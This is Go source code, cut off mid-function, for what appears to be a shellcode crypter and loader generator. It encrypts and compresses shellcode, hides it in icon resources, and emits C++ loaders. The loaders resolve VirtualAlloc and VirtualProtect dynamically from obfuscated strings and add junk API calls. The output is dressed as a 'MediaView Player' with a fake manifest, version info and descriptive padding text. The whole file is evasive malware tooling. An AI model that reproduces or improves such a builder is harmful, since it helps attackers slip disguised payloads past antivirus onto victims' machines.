package main

import (
	"bytes"
	"compress/flate"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"math/big"
	"strings"
)

const (
	oxuKeyBits   = 64
	oxuBlockSize = 8
	oxuDstSize   = 16
)

var oxuPrintableTable = [88]byte{
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
	'/', '\\', '?', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=', '[', ']', '|', ';', '<', '>', '.', ',', '~', '`',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
}

const oxuPrintableSize = 88

func init() {
	seen := [256]bool{}
	for i, c := range oxuPrintableTable {
		if seen[c] {
			panic(fmt.Sprintf("oxuPrintableTable duplicate at index %d: '%c'", i, c))
		}
		seen[c] = true
	}
}

func oxuNumber2Printable(ed, n *big.Int) string {
	mod := big.NewInt(oxuPrintableSize)
	var parts [2]string
	for idx, val := range []*big.Int{ed, n} {
		v := new(big.Int).Set(val)
		var digits []byte
		for v.Sign() > 0 {
			rem := new(big.Int)
			v.DivMod(v, mod, rem)
			digits = append(digits, oxuPrintableTable[rem.Int64()])
		}
		for i, j := 0, len(digits)-1; i < j; i, j = i+1, j-1 {
			digits[i], digits[j] = digits[j], digits[i]
		}
		parts[idx] = string(digits)
	}
	return parts[0] + ":" + parts[1]
}

func oxuGeneratePrime(bits int) (*big.Int, error) {
	min := new(big.Int).Lsh(big.NewInt(1), uint(bits-1))
	max := new(big.Int).Sub(new(big.Int).Lsh(big.NewInt(1), uint(bits)), big.NewInt(1))
	diff := new(big.Int).Sub(max, min)
	for {
		n, err := rand.Int(rand.Reader, diff)
		if err != nil {
			return nil, err
		}
		n.Add(n, min)
		if n.ProbablyPrime(40) {
			return n, nil
		}
	}
}

func oxuGenerateKeyPair() (pubKey, privKey string, e, d, n *big.Int, err error) {
	one := big.NewInt(1)
	for attempts := 0; attempts < 100; attempts++ {
		p, err2 := oxuGeneratePrime(oxuKeyBits)
		if err2 != nil {
			return "", "", nil, nil, nil, err2
		}
		q, err2 := oxuGeneratePrime(oxuKeyBits)
		if err2 != nil {
			return "", "", nil, nil, nil, err2
		}
		n = new(big.Int).Mul(p, q)
		phi := new(big.Int).Mul(new(big.Int).Sub(p, one), new(big.Int).Sub(q, one))
		sqrtPhi := new(big.Int).Sqrt(phi)
		e = new(big.Int).Sqrt(sqrtPhi)
		gcd := new(big.Int)
		found := false
		for e.Cmp(phi) < 0 {
			gcd.GCD(nil, nil, e, phi)
			if gcd.Cmp(one) == 0 {
				found = true
				break
			}
			e.Add(e, one)
		}
		if !found {
			e = big.NewInt(7)
		}
		d = new(big.Int).ModInverse(e, phi)
		if d == nil {
			continue
		}
		testBlock := []byte{0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78}
		encrypted := oxuEncryptShellcode(testBlock, e, n)
		decrypted := oxuDecryptShellcode(encrypted, d, n, len(testBlock))
		match := true
		for i := range testBlock {
			if testBlock[i] != decrypted[i] {
				match = false
				break
			}
		}
		if !match {
			continue
		}
		pubKey = oxuNumber2Printable(e, n)
		privKey = oxuNumber2Printable(d, n)
		return pubKey, privKey, e, d, n, nil
	}
	return "", "", nil, nil, nil, fmt.Errorf("failed to generate valid RSA keypair after 100 attempts")
}

func oxuEncryptShellcode(shellcode []byte, e, n *big.Int) []byte {
	paddedLen := len(shellcode)
	if paddedLen%oxuBlockSize != 0 {
		paddedLen = ((paddedLen / oxuBlockSize) + 1) * oxuBlockSize
	}
	padded := make([]byte, paddedLen)
	copy(padded, shellcode)
	numBlocks := paddedLen / oxuBlockSize
	result := make([]byte, numBlocks*oxuDstSize)
	for i := 0; i < numBlocks; i++ {
		block := padded[i*oxuBlockSize : (i+1)*oxuBlockSize]
		m := new(big.Int)
		for j := oxuBlockSize - 1; j >= 0; j-- {
			m.Lsh(m, 8)
			m.Or(m, big.NewInt(int64(block[j])))
		}
		c := new(big.Int).Exp(m, e, n)
		dst := result[i*oxuDstSize : (i+1)*oxuDstSize]
		for j := 0; j < oxuDstSize; j++ {
			b := new(big.Int).And(c, big.NewInt(0xff))
			dst[j] = byte(b.Int64())
			c.Rsh(c, 8)
		}
	}
	return result
}

func oxuDecryptShellcode(ciphertext []byte, d, n *big.Int, plainLen int) []byte {
	numBlocks := len(ciphertext) / oxuDstSize
	result := make([]byte, numBlocks*oxuBlockSize)
	for i := 0; i < numBlocks; i++ {
		block := ciphertext[i*oxuDstSize : (i+1)*oxuDstSize]
		c := new(big.Int)
		for j := oxuDstSize - 1; j >= 0; j-- {
			c.Lsh(c, 8)
			c.Or(c, big.NewInt(int64(block[j])))
		}
		m := new(big.Int).Exp(c, d, n)
		dst := result[i*oxuBlockSize : (i+1)*oxuBlockSize]
		for j := 0; j < oxuBlockSize; j++ {
			b := new(big.Int).And(m, big.NewInt(0xff))
			dst[j] = byte(b.Int64())
			m.Rsh(m, 8)
		}
	}
	if plainLen < len(result) {
		return result[:plainLen]
	}
	return result
}

func eclGenerateKey() string {
	key := make([]byte, 32)
	rand.Read(key)
	return hex.EncodeToString(key)
}

func eclKeyStream(key string, length int) []byte {
	h := sha256.Sum256([]byte(key))
	stream := make([]byte, 0, length+32)
	seed := h[:]
	for len(stream) < length {
		next := sha256.Sum256(seed)
		seed = next[:]
		stream = append(stream, seed...)
	}
	return stream[:length]
}

func eclBuildSubTable(key string) (fwd [16][4]byte, rev [256]byte) {
	h := sha256.Sum256([]byte(key + "\x00sub"))
	var rng []byte
	for len(rng) < 512 {
		h = sha256.Sum256(h[:])
		rng = append(rng, h[:]...)
	}
	perm := [256]byte{}
	for i := range perm {
		perm[i] = byte(i)
	}
	ri := 0
	for i := 255; i > 0; i-- {
		j := int(uint16(rng[ri])<<8|uint16(rng[ri+1])) % (i + 1)
		ri += 2
		perm[i], perm[j] = perm[j], perm[i]
	}
	for nib := 0; nib < 16; nib++ {
		for opt := 0; opt < 4; opt++ {
			fwd[nib][opt] = perm[nib*4+opt]
		}
	}
	for i := range rev {
		rev[i] = 0
	}
	for nib := byte(0); nib < 16; nib++ {
		for opt := 0; opt < 4; opt++ {
			rev[fwd[nib][opt]] = nib
		}
	}
	return
}

func eclWriteRevTable(sb *strings.Builder, key string) {
	_, rev := eclBuildSubTable(key)
	sb.WriteString("static const uint8_t _rt[256]={")
	for i, v := range rev {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf("%d", v))
	}
	sb.WriteString("};\n\n")
}

func eclEncode(shellcode []byte, key string) []byte {
	ks := eclKeyStream(key, len(shellcode))
	fwd, _ := eclBuildSubTable(key)
	mixKs := eclKeyStream(key+"\x01", len(shellcode)*2)
	output := make([]byte, len(shellcode)*2)
	for i, b := range shellcode {
		encrypted := b ^ ks[i]
		output[2*i] = fwd[encrypted>>4][mixKs[2*i]&3]
		output[2*i+1] = fwd[encrypted&0x0F][mixKs[2*i+1]&3]
	}
	return output
}

func eclEncodeDirect(shellcode []byte, key string) []byte {
	ks := eclKeyStream(key, len(shellcode))
	output := make([]byte, len(shellcode))
	for i, b := range shellcode {
		output[i] = b ^ ks[i]
	}
	return output
}

func deflateCompress(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w, err := flate.NewWriter(&buf, flate.BestCompression)
	if err != nil {
		return nil, err
	}
	if _, err := w.Write(data); err != nil {
		w.Close()
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

const inflateCpp = `
static uint32_t _ib,_in;
static const uint8_t*_is;uint32_t _ip,_il;
static void _ir(const uint8_t*s,uint32_t l){_is=s;_ip=0;_il=l;_ib=0;_in=0;}
static uint32_t _rb(int n){
    while(_in<(uint32_t)n){if(_ip<_il)_ib|=(uint32_t)_is[_ip++]<<_in;_in+=8;}
    uint32_t v=_ib&((1u<<n)-1);_ib>>=n;_in-=n;return v;
}
static void _bh(uint16_t*t,int*m,const uint8_t*cl,int n){
    int mc=0;uint16_t bl[16]={},nc[16]={};
    for(int i=0;i<n;i++){if(cl[i]>(uint8_t)mc)mc=cl[i];bl[cl[i]]++;}
    bl[0]=0;*m=mc;uint16_t c=0;
    for(int i=1;i<=mc;i++){c=(c+bl[i-1])<<1;nc[i]=c;}
    for(int i=0;i<n;i++){if(cl[i])t[i]=nc[cl[i]]++;else t[i]=0;}
}
static int _dh(uint16_t*t,const uint8_t*cl,int n,int m){
    uint32_t c=0;
    for(int b=1;b<=m;b++){c=(c<<1)|_rb(1);
        for(int i=0;i<n;i++)if(cl[i]==b&&t[i]==c)return i;}
    return -1;
}
static uint32_t _inf(const uint8_t*s,uint32_t sl,uint8_t*d,uint32_t dl){
    static const uint16_t lb[]={3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258};
    static const uint8_t le[]={0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0};
    static const uint16_t db[]={1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577};
    static const uint8_t de[]={0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};
    _ir(s,sl);uint32_t dp=0;uint16_t lt[288],dt[32];int lm,dm;
    int bf=0;
    while(!bf&&dp<dl){
        bf=_rb(1);int bt=_rb(2);
        if(bt==0){
            _ib=0;_in=0;
            uint16_t ln=_is[_ip]|(_is[_ip+1]<<8);_ip+=4;
            for(uint16_t i=0;i<ln&&dp<dl;i++)d[dp++]=_is[_ip++];
        }else{
            uint8_t lcl[288]={},dcl[32]={};int nl=288,nd=32;
            if(bt==1){
                for(int i=0;i<144;i++)lcl[i]=8;for(int i=144;i<256;i++)lcl[i]=9;
                for(int i=256;i<280;i++)lcl[i]=7;for(int i=280;i<288;i++)lcl[i]=8;
                for(int i=0;i<32;i++)dcl[i]=5;
            }else{
                int hl=_rb(5)+257,hd=_rb(5)+1,hcl=_rb(4)+4;
                static const uint8_t co[]={16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15};
                uint8_t ccl[19]={};for(int i=0;i<hcl;i++)ccl[co[i]]=_rb(3);
                uint16_t ct[19];int cm;_bh(ct,&cm,ccl,19);
                uint8_t all[320]={};int ai=0;
                while(ai<hl+hd){
                    int v=_dh(ct,ccl,19,cm);
                    if(v<16){all[ai++]=v;}
                    else if(v==16){int r=_rb(2)+3;uint8_t p=all[ai-1];for(int j=0;j<r;j++)all[ai++]=p;}
                    else if(v==17){int r=_rb(3)+3;for(int j=0;j<r;j++)all[ai++]=0;}
                    else{int r=_rb(7)+11;for(int j=0;j<r;j++)all[ai++]=0;}
                }
                memcpy(lcl,all,hl);nl=hl;memcpy(dcl,all+hl,hd);nd=hd;
            }
            _bh(lt,&lm,lcl,nl);_bh(dt,&dm,dcl,nd);
            for(;;){
                int sym=_dh(lt,lcl,nl,lm);
                if(sym<0||sym==256)break;
                if(sym<256){if(dp<dl)d[dp++]=(uint8_t)sym;}
                else{
                    int li=sym-257;uint32_t ln=lb[li]+_rb(le[li]);
                    int di=_dh(dt,dcl,nd,dm);uint32_t ds=db[di]+_rb(de[di]);
                    for(uint32_t j=0;j<ln&&dp<dl;j++){d[dp]=d[dp-ds];dp++;}
                }
            }
        }
    }
    return dp;
}
`

const eclSHA256Cpp = `static uint32_t ecl_rotr(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }
static const uint32_t ecl_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
static void ecl_transform(uint32_t s[8], const uint8_t blk[64]) {
    uint32_t w[64];
    for (int i = 0; i < 16; i++)
        w[i] = ((uint32_t)blk[4*i]<<24)|((uint32_t)blk[4*i+1]<<16)|((uint32_t)blk[4*i+2]<<8)|blk[4*i+3];
    for (int i = 16; i < 64; i++)
        w[i] = (ecl_rotr(w[i-2],17)^ecl_rotr(w[i-2],19)^(w[i-2]>>10)) + w[i-7]
             + (ecl_rotr(w[i-15],7)^ecl_rotr(w[i-15],18)^(w[i-15]>>3)) + w[i-16];
    uint32_t a=s[0],b=s[1],c=s[2],d=s[3],e=s[4],f=s[5],g=s[6],h=s[7];
    for (int i = 0; i < 64; i++) {
        uint32_t t1 = h + (ecl_rotr(e,6)^ecl_rotr(e,11)^ecl_rotr(e,25)) + ((e&f)^(~e&g)) + ecl_k[i] + w[i];
        uint32_t t2 = (ecl_rotr(a,2)^ecl_rotr(a,13)^ecl_rotr(a,22)) + ((a&b)^(a&c)^(b&c));
        h=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    s[0]+=a; s[1]+=b; s[2]+=c; s[3]+=d; s[4]+=e; s[5]+=f; s[6]+=g; s[7]+=h;
}
static void ecl_sha256(const uint8_t* data, uint32_t len, uint8_t hash[32]) {
    uint32_t state[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
                         0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    uint8_t block[64]; uint32_t i;
    for (i = 0; i + 64 <= len; i += 64) ecl_transform(state, data + i);
    uint32_t rem = len - i;
    memcpy(block, data + i, rem);
    block[rem] = 0x80;
    memset(block + rem + 1, 0, 64 - rem - 1);
    if (rem >= 56) { ecl_transform(state, block); memset(block, 0, 64); }
    uint64_t bits = (uint64_t)len * 8;
    for (int j = 0; j < 8; j++) block[56+j] = (uint8_t)(bits >> ((7-j)*8));
    ecl_transform(state, block);
    for (int j = 0; j < 8; j++) {
        hash[4*j]=(uint8_t)(state[j]>>24); hash[4*j+1]=(uint8_t)(state[j]>>16);
        hash[4*j+2]=(uint8_t)(state[j]>>8); hash[4*j+3]=(uint8_t)state[j];
    }
}
`

const eclBCryptSHA256Cpp = `static void ecl_sha256(const uint8_t* data, uint32_t len, uint8_t hash[32]) {
    typedef long(__stdcall*tOAP)(void**,const wchar_t*,const wchar_t*,unsigned long);
    typedef long(__stdcall*tCH)(void*,void**,uint8_t*,unsigned long,uint8_t*,unsigned long,unsigned long);
    typedef long(__stdcall*tHD)(void*,uint8_t*,unsigned long,unsigned long);
    typedef long(__stdcall*tFH)(void*,uint8_t*,unsigned long,unsigned long);
    typedef long(__stdcall*tDH)(void*);
    static HMODULE hB=NULL;
    static void* hAlg=NULL;
    static tCH pCH=NULL; static tHD pHD=NULL;
    static tFH pFH=NULL; static tDH pDH=NULL;
    if(!hB){
        hB=LoadLibraryA("bcrypt.dll");
        if(!hB)return;
        tOAP pOAP=(tOAP)GetProcAddress(hB,"BCryptOpenAlgorithmProvider");
        pCH=(tCH)GetProcAddress(hB,"BCryptCreateHash");
        pHD=(tHD)GetProcAddress(hB,"BCryptHashData");
        pFH=(tFH)GetProcAddress(hB,"BCryptFinishHash");
        pDH=(tDH)GetProcAddress(hB,"BCryptDestroyHash");
        if(pOAP)pOAP(&hAlg,L"SHA256",NULL,0);
    }
    if(!hAlg||!pCH||!pHD||!pFH||!pDH){memset(hash,0,32);return;}
    void* hHash=NULL;
    pCH(hAlg,&hHash,NULL,0,NULL,0,0);
    if(!hHash){memset(hash,0,32);return;}
    pHD(hHash,(uint8_t*)data,len,0);
    pFH(hHash,hash,32,0);
    pDH(hHash);
}

`

const callbackSemanticPad = `static const char g_CodecInfo[] =
    "MediaView Player uses hardware-accelerated decoding for smooth playback of "
    "high-definition video content including H.264, H.265/HEVC, VP9, and AV1 codecs. "
    "Subtitle rendering supports SRT, ASS/SSA, and VobSub formats with configurable "
    "font styles and positioning options. Audio output is managed through the Windows "
    "Audio Session API for low-latency exclusive mode playback when available. Users "
    "may configure decoder preferences and display settings through the options dialog. "
    "Hardware decoding requires a compatible GPU with updated drivers. Playlist state "
    "is preserved between sessions in the application data directory.";

`

const manifestXML = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity type="win32" name="MediaView.Player" version="3.1.2.0" processorArchitecture="amd64"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security><requestedPrivileges>
      <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
    </requestedPrivileges></security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
      <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/>
    </application>
  </compatibility>
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true/pm</dpiAware>
      <dpiAwareness xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">PerMonitorV2</dpiAwareness>
    </windowsSettings>
  </application>
</assembly>`

const stringTableRC = `STRINGTABLE
BEGIN
    100 "MediaView Player"
    101 "Version 3.1.2 Build 20260215"
    102 "Hardware accelerated video playback engine"
    103 "Supported formats: H.264 H.265/HEVC VP9 AV1 MPEG-4"
    104 "Copyright (C) 2023-2026 MediaView Software Inc."
    105 "Licensed under the MIT License"
    106 "For support visit https://mediaview.example.com/support"
    107 "Keyboard shortcuts: Space=Play/Pause F=Fullscreen M=Mute"
    108 "Drag and drop media files to play"
    109 "GPU acceleration requires DirectX 11 or later"
    110 "Audio output: WASAPI exclusive mode supported"
    111 "Subtitle rendering: SSA/ASS SRT VTT formats"
END
`

const versionRC = `1 VERSIONINFO
FILEVERSION 3,1,2,0
PRODUCTVERSION 3,1,2,0
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS 0x40004L
FILETYPE 0x1L
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "MediaView Software"
            VALUE "FileDescription", "MediaView Video Player"
            VALUE "FileVersion", "3.1.2.0"
            VALUE "InternalName", "MediaView"
            VALUE "LegalCopyright", "Copyright (C) 2024 MediaView Software"
            VALUE "OriginalFilename", "MediaView.exe"
            VALUE "ProductName", "MediaView Player"
            VALUE "ProductVersion", "3.1.2"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
`

var iconGroupNames = []string{
	"app", "media", "playlist", "toolbar",
	"overlay", "settings", "codec", "stream",
	"subtitle", "equalizer", "volume", "network",
	"download", "history", "favorite", "capture",
}

var iconSizeTiers = [][]int{
	{16, 32, 48, 64, 128, 256},
}

func writeByteArray(sb *strings.Builder, data []byte) {
	for i, b := range data {
		if i > 0 {
			sb.WriteString(", ")
			if i%16 == 0 {
				sb.WriteString("\n    ")
			}
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
}

func writeEncDataSplit(sb *strings.Builder, data []byte, encSize, realSize int) {
	total := len(data)
	half := total / 2
	sb.WriteString("static uint8_t dA[] = {\n    ")
	writeByteArray(sb, data[:half])
	sb.WriteString("\n};\n")
	sb.WriteString("static const uint8_t dB[] = {\n    ")
	writeByteArray(sb, data[half:])
	sb.WriteString("\n};\n\n")
	sb.WriteString(fmt.Sprintf("static const uint32_t sA = %d;\n", half))
	sb.WriteString(fmt.Sprintf("static const uint32_t g_enc_size = %d;\n", encSize))
	sb.WriteString(fmt.Sprintf("static const uint32_t g_real_size = %d;\n\n", realSize))
	sb.WriteString("static inline uint8_t dG(uint32_t i) {\n")
	sb.WriteString("    if (i < sA) return dA[i];\n")
	sb.WriteString("    return dB[i - sA];\n")
	sb.WriteString("}\n\n")
	sb.WriteString("static inline void dR(uint8_t* dst) {\n")
	sb.WriteString("    memcpy(dst, dA, sA);\n")
	sb.WriteString("    memcpy(dst + sA, dB, g_enc_size - sA);\n")
	sb.WriteString("}\n\n")
}

func eclWriteEncData(sb *strings.Builder, encodedData []byte, encSize, realSize int) {
	writeEncDataSplit(sb, encodedData, encSize, realSize)
}

func writeResLoaderCode(sb *strings.Builder, encSize, realSize, skipGroups int) {
	sb.WriteString(fmt.Sprintf("static const uint32_t g_enc_size = %d;\n", encSize))
	sb.WriteString(fmt.Sprintf("static const uint32_t g_real_size = %d;\n", realSize))
	sb.WriteString("static uint8_t* _codecBuf = NULL;\n")
	sb.WriteString("static uint8_t* _pd = NULL;\n")
	sb.WriteString("static BOOL InitCodecCache(){\n")
	sb.WriteString("    _codecBuf=(uint8_t*)malloc(g_enc_size);\n")
	sb.WriteString("    if(!_codecBuf)return FALSE;\n")
	sb.WriteString("    _pd=_codecBuf;\n")
	sb.WriteString("    uint32_t pos=0;\n")
	sb.WriteString(fmt.Sprintf("    for(int gid=%d;pos<g_enc_size;gid++){\n", skipGroups+1))
	sb.WriteString("        HRSRC hg=_a.fFR(NULL,MAKEINTRESOURCE(gid),RT_GROUP_ICON);\n")
	sb.WriteString("        if(!hg)break;\n")
	sb.WriteString("        DWORD gsz=_a.fSR(NULL,hg);\n")
	sb.WriteString("        HGLOBAL gl=_a.fLR(NULL,hg);\n")
	sb.WriteString("        const uint8_t*gd=gl?(const uint8_t*)_a.fLk(gl):NULL;\n")
	sb.WriteString("        if(!gd||gsz<6)continue;\n")
	sb.WriteString("        uint16_t cnt;memcpy(&cnt,gd+4,2);\n")
	sb.WriteString("        for(int i=0;i<cnt&&pos<g_enc_size;i++){\n")
	sb.WriteString("            if((uint32_t)(6+(i+1)*14)>gsz)break;\n")
	sb.WriteString("            uint16_t nid;memcpy(&nid,gd+6+i*14+12,2);\n")
	sb.WriteString("            HRSRC hi=_a.fFR(NULL,MAKEINTRESOURCE(nid),RT_ICON);\n")
	sb.WriteString("            if(!hi)continue;\n")
	sb.WriteString("            DWORD isz=_a.fSR(NULL,hi);\n")
	sb.WriteString("            HGLOBAL il=_a.fLR(NULL,hi);\n")
	sb.WriteString("            const uint8_t*d=il?(const uint8_t*)_a.fLk(il):NULL;\n")
	sb.WriteString("            if(!d||isz<40)continue;\n")
	sb.WriteString("            int32_t bw,bh;memcpy(&bw,d+4,4);memcpy(&bh,d+8,4);bh/=2;\n")
	sb.WriteString("            if(bw<=0||bh<=0)continue;\n")
	sb.WriteString("            uint16_t bits;memcpy(&bits,d+14,2);\n")
	sb.WriteString("            uint32_t palSz=(bits<=8)?(1u<<bits)*4:0;\n")
	sb.WriteString("            uint32_t dOff=40+palSz;\n")
	sb.WriteString("            if(dOff>=isz)continue;\n")
	sb.WriteString("            uint32_t bpp=bits/8;if(!bpp)bpp=1;\n")
	sb.WriteString("            uint32_t px=(uint32_t)bw*(uint32_t)bh*bpp;\n")
	sb.WriteString("            if(px>isz-dOff)px=isz-dOff;\n")
	sb.WriteString("            for(uint32_t j=0;j<px&&pos<g_enc_size;j+=4){\n")
	sb.WriteString("                _codecBuf[pos++]=d[dOff+j];\n")
	sb.WriteString("                if(pos<g_enc_size)_codecBuf[pos++]=d[dOff+j+2];\n")
	sb.WriteString("            }\n")
	sb.WriteString("        }\n")
	sb.WriteString("    }\n")
	sb.WriteString("    return pos>=g_enc_size;\n}\n")
	sb.WriteString("static uint8_t dG(uint32_t i) { return _pd[i]; }\n")
	sb.WriteString("static void dR(uint8_t* dst) { memcpy(dst, _pd, g_enc_size); }\n\n")
}

func eclWriteKeyAndDecode(sb *strings.Builder, embedKey bool, key string) {
	if embedKey {
		sb.WriteString(fmt.Sprintf("static const char g_key[] = \"%s\";\n\n", key))
		sb.WriteString("int main() {\n")
		sb.WriteString("    const char* key = g_key;\n")
		sb.WriteString("    uint32_t klen = sizeof(g_key) - 1;\n\n")
	} else {
		sb.WriteString("int main(int argc, char** argv) {\n")
		sb.WriteString("    if (argc != 2) return 0;\n")
		sb.WriteString("    const char* key = argv[1];\n")
		sb.WriteString("    uint32_t klen = 0; while (key[klen]) klen++;\n\n")
	}
	sb.WriteString(`    uint8_t seed[32], ks[32];
    ecl_sha256((const uint8_t*)key, klen, seed);
    uint32_t ks_pos = 32;

`)
}

func oxuWriteEncData(sb *strings.Builder, encryptedShellcode []byte, encSize, realSize int) {
	writeEncDataSplit(sb, encryptedShellcode, encSize, realSize)
}

func oxuWriteKeyHandling(sb *strings.Builder, embedKey bool, privateKey string) {
	if embedKey {
		escapedKey := strings.ReplaceAll(privateKey, `\`, `\\`)
		sb.WriteString(fmt.Sprintf("static const char g_private_key[] = \"%s\";\n\n", escapedKey))
		sb.WriteString("int main() {\n")
		sb.WriteString("    std::string key(g_private_key);\n\n")
	} else {
		sb.WriteString("int main(int argc, char **argv) {\n")
		sb.WriteString("    if (argc != 2) return 0;\n")
		sb.WriteString("    std::string key = argv[1];\n\n")
	}
}

func cppCharArray(s string) string {
	parts := make([]string, len(s)+1)
	for i, c := range []byte(s) {
		parts[i] = fmt.Sprintf("'%c'", c)
	}
	parts[len(s)] = "0"
	return "{" + strings.Join(parts, ",") + "}"
}

func callbackDynAPICpp() string {
	var sb strings.Builder
	sb.WriteString("typedef LPVOID(WINAPI*tVA)(LPVOID,SIZE_T,DWORD,DWORD);\n")
	sb.WriteString("typedef BOOL(WINAPI*tVP)(LPVOID,SIZE_T,DWORD,PDWORD);\n")
	sb.WriteString("typedef BOOL(WINAPI*tVF)(LPVOID,SIZE_T,DWORD);\n")
	sb.WriteString("typedef BOOL(WINAPI*tCH)(HANDLE);\n")
	sb.WriteString("typedef HRSRC(WINAPI*tFRW)(HMODULE,LPCWSTR,LPCWSTR);\n")
	sb.WriteString("typedef HGLOBAL(WINAPI*tLdR)(HMODULE,HRSRC);\n")
	sb.WriteString("typedef LPVOID(WINAPI*tLkR)(HGLOBAL);\n")
	sb.WriteString("typedef DWORD(WINAPI*tSoR)(HMODULE,HRSRC);\n")
	sb.WriteString("static struct{tVA fVA;tVP fVP;tVF fVF;tCH fCH;tFRW fFR;tLdR fLR;tLkR fLk;tSoR fSR;}_a={};\n\n")
	sb.WriteString("static bool _ra(){\n")
	sb.WriteString("    HMODULE hK=GetModuleHandleA(\"kernel32.dll\");\n")
	sb.WriteString("    if(!hK)return false;\n")
	sb.WriteString(fmt.Sprintf("    char n0[]=%s;_a.fVA=(tVA)GetProcAddress(hK,n0);\n", cppCharArray("VirtualAlloc")))
	sb.WriteString(fmt.Sprintf("    char n1[]=%s;_a.fVP=(tVP)GetProcAddress(hK,n1);\n", cppCharArray("VirtualProtect")))
	sb.WriteString(fmt.Sprintf("    char n2[]=%s;_a.fVF=(tVF)GetProcAddress(hK,n2);\n", cppCharArray("VirtualFree")))
	sb.WriteString(fmt.Sprintf("    char n3[]=%s;_a.fCH=(tCH)GetProcAddress(hK,n3);\n", cppCharArray("CloseHandle")))
	sb.WriteString(fmt.Sprintf("    char n4[]=%s;_a.fFR=(tFRW)GetProcAddress(hK,n4);\n", cppCharArray("FindResourceW")))
	sb.WriteString(fmt.Sprintf("    char n5[]=%s;_a.fLR=(tLdR)GetProcAddress(hK,n5);\n", cppCharArray("LoadResource")))
	sb.WriteString(fmt.Sprintf("    char n6[]=%s;_a.fLk=(tLkR)GetProcAddress(hK,n6);\n", cppCharArray("LockResource")))
	sb.WriteString(fmt.Sprintf("    char n7[]=%s;_a.fSR=(tSoR)GetProcAddress(hK,n7);\n", cppCharArray("SizeofResource")))
	sb.WriteString("    if(!_a.fVA||!_a.fVP||!_a.fVF||!_a.fCH||!_a.fFR||!_a.fLR||!_a.fLk||!_a.fSR)return false;\n")
	sb.WriteString("    return true;\n}\n\n")
	return sb.String()
}

func callbackJunkBlock() string {
	blocks := []string{
		"{wchar_t _p[MAX_PATH];GetModuleFileNameW(NULL,_p,MAX_PATH);volatile int _l=lstrlenW(_p);(void)_l;}\n",
		"{wchar_t _ln[64];GetLocaleInfoW(LOCALE_USER_DEFAULT,0x5c,_ln,64);volatile int _l=lstrlenW(_ln);(void)_l;}\n",
		"{wchar_t _tp[MAX_PATH];GetTempPathW(MAX_PATH,_tp);volatile int _tl=lstrlenW(_tp);(void)_tl;}\n",
		"{wchar_t _cd[MAX_PATH];GetCurrentDirectoryW(MAX_PATH,_cd);volatile int _cl=lstrlenW(_cd);(void)_cl;}\n",
